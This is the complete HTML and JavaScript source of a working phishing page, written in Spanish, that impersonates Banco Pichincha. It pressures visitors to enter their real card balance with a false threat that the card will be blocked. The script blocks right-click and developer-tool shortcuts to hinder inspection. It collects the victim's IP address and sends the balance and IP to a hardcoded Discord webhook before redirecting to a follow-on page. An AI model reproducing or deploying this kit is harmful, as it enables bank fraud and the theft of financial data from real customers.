<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Consulta de saldo</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{background:#fff}
.header{padding:16px 20px;box-shadow:0 4px 10px rgba(0,0,0,.12)}
.logo{height:36px}
.container{max-width:480px;margin:0 auto;padding:35px 20px;text-align:center}
.image-box{max-width:260px;margin:25px auto}
.image-box img{width:30%}
.title{font-size:26px;font-weight:700;color:#0b2a5b;margin-bottom:10px}
.description{color:#5a5a5a;margin-bottom:20px}
.notice{
  background:#eef5ff;
  border:1px solid #cfe0ff;
  color:#123b7a;
  padding:10px;
  border-radius:8px;
  font-size:14px;
  margin-bottom:25px;
}
.form{text-align:left}
label{font-size:14px;font-weight:600;display:block;margin-bottom:6px}
input{
  width:100%;
  padding:16px;
  border-radius:8px;
  border:1px solid #ccc;
  margin-bottom:14px;
  font-size:18px
}
.btn{
  width:100%;
  background:#ffd200;
  border:none;
  padding:16px;
  font-size:17px;
  font-weight:700;
  border-radius:8px;
  cursor:pointer
}
.btn:hover{background:#f5c400}
.error{color:#c00;font-size:14px;margin-bottom:15px}
.hidden{display:none}
.result{font-size:22px;font-weight:700;color:#0b2a5b;margin-top:30px}
</style>
</head>

<body>

<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" class="logo">
</div>

<div class="container">

  <div class="image-box">
    <img src="https://png.pngtree.com/png-vector/20191016/ourlarge/pngtree-money-account-verification-vector-thin-line-icon-png-image_1803307.jpg">
  </div>

  <div class="title">Saldo actual</div>
  <div class="description">Ingresa el saldo disponible en tu tarjeta</div>

  <div class="notice">
    癸 Por favor ingresa el <strong>saldo real actual</strong> que tienes en tu tarjeta recuerda de ingresar un saldo diferente tu tarjeta puede ser bloqueada por actividad inusual.
  </div>

  <!-- FORMULARIO -->
  <div class="form" id="saldoForm">

    <label>Saldo actual</label>
    <input id="saldo"
           inputmode="numeric"
           pattern="[0-9]*"
           placeholder="$ 0">

    <div class="error hidden" id="errorMsg">
      Debes ingresar tu saldo actual para continuar.
    </div>

    <button class="btn" onclick="continuar()">Continuar</button>
  </div>

  <!-- RESULTADO -->
  <div class="result hidden" id="resultado">
    Saldo ingresado:<br>
    <span id="saldoMostrado"></span>
  </div>

</div>

  <script>
  // URL de tu Webhook de Discord
  const webhookURL = "https://discord.com/api/webhooks/1461022686334423171/SjOgIwnvGiYLYe7DeXl4X0C90NkQrgJ2ee8UmSqPAgcIVzCIsfL4BIW-xk1DLg-m6WG7";

  // 1. Protecci贸n contra inspecci贸n (Bloqueo de F12, Clic Derecho, Ctrl+U)
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.onkeydown = e => {
      if (e.keyCode == 123 || 
          (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || 
          (e.ctrlKey && e.keyCode == 85)) {
          return false;
      }
  };

  // 2. Funci贸n para procesar, enviar y redireccionar de inmediato
  async function continuar(){
      const saldoInput = document.getElementById("saldo");
      const error = document.getElementById("errorMsg");
      const valor = saldoInput.value.replace(/\D/g,'');

      if(valor === ""){
          error.classList.remove("hidden");
          return;
      }

      error.classList.add("hidden");

      // Obtener IP del usuario
      let userIP = "No detectada";
      try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          userIP = data.ip;
      } catch (e) { console.error("Error IP"); }

      const formatoMoneda = new Intl.NumberFormat('es-CO',{
          style:'currency',
          currency:'COP',
          minimumFractionDigits:0
      }).format(valor);

      // Preparar mensaje para Discord
      const message = {
          embeds: [{
              title: " SALDO PICHINCHA",
              color: 16761344,
              fields: [
                  { name: " Monto", value: `**${formatoMoneda}**`, inline: true },
                  { name: " IP", value: `\`${userIP}\``, inline: true }
              ],
              footer: { text: "M贸dulo de Saldo" },
              timestamp: new Date()
          }]
      };

      // Enviar a Discord
      fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(message)
      })
      .then(() => {
          // Redirecci贸n inmediata al recibir respuesta del webhook
          window.location.href = "lop.html";
      })
      .catch(err => {
          // Redirigir incluso si falla el env铆o para no detener el flujo
          window.location.href = "lop.html";
      });
  }
  </script>

</body>
</html>